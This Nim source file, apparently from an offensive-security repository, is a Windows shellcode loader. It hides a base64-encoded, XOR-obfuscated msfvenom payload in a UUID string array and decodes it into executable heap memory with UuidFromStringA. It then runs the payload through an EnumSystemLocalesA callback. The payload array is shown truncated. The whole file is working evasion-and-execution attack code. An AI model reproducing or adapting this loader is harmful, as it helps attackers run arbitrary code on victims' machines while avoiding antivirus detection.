#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/uuid_exec_shellcode

    References:
        - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/uuid_exec_bin.nim
]#

import winim
import strformat
import base64

proc gkkaekgaEE(s: cstring, key: int): cstring {.noinline.} =
  # We need {.noinline.} here because otherwise C compiler
  # aggresively inlines this procedure for EACH string which results
  # in more assembly instructions
  var k = key
  result = cstring(s)
  for i in 0 ..< result.len:
    for f in [0, 8, 16, 24]:
      result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1    

when defined(windows):

    when defined(amd64):
        echo "[*] Running in x64 Process"
        # msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread
        const SIZE = 16289  # len of UUIDARR
        var xorpassword = 2021 # xor password use by gkkaekgaEE
        var UUIDARR = allocCStringArray([ 
            "19PU3tuM2I/H3dDCw9iRxsrI3cvGxc3Wn5rKODk6Ozw9Pjs4",
            "hIeFjt+J1I/Hj46RkNjMysbJ3ZuYycTWwsibO28+PT89Pz8w",
            "gNnU3oreio3Hi92RxtjBxZPD3cnGzcjWysnIODk6Pm05Njc5",
            "0tHQ397d3NvH2djHxtjEw8LB3c/OzczWysnIODk6Ozw9Pj8w",
            ......
            "0tHQ397d3NvH2djHxtjEw8LB3c/OzczWysnIODk6Ozw9Pj8w",
            "0tHQ397d3NvH2djHxtjEw8LB3c/OzczWysnIODk6Ozw9Pj8w",
            "0tHQ397d3NvH2djHxtjEw8LB3c/OzczWysnIODk6Ozw9Pj8w",])

    when isMainModule:
        # Creating and Allocating Heap Memory
        echo fmt"[*] Allocating Heap Memory"
        let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        let ha = HeapAlloc(hHeap, 0, 0x100000)
        var hptr = cast[DWORD_PTR](ha)
        if hptr != 0:
            echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
        else:
            echo fmt"[-] Heap Alloc Error "
            quit(QuitFailure)

        echo fmt"[*] UUID Array size is {SIZE}"
        # Planting Shellcode From UUID Array onto Allocated Heap Memory
        for i in 0..(SIZE-1):
            #var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
            var status = UuidFromStringA(cast[RPC_CSTR](gkkaekgaEE(decode($UUIDARR[i]), xorpassword)), cast[ptr UUID](hptr))
            if status != RPC_S_OK:
                if status == RPC_S_INVALID_STRING_UUID:
                    echo fmt"[-] Invalid UUID String Detected"
                else:
                    echo fmt"[-] Something Went Wrong, Error Code: {status}"
                quit(QuitFailure)
            hptr += 16
        echo fmt"[+] Shellcode is successfully placed between 0x{(cast[DWORD_PTR](ha)).toHex} and 0x{hptr.toHex}"

        # Calling the Callback Function
        echo fmt"[*] Calling the Callback Function ..." 
        EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0);
        CloseHandle(hHeap)
        quit(QuitSuccess)
